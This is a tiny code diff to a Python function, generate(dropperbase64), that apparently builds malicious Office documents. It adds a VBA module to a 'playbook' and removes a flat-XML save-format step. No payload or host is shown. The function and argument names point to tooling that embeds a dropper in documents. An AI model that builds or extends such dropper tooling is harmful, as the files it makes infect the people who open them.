@@ -193,6 +193,4 @@ def generate(dropperbase64):
 
     playbook.append({'add_vba_module': vba})
 
-    playbook.append({'set_save_format': 'flatxml'})
-
     return playbook
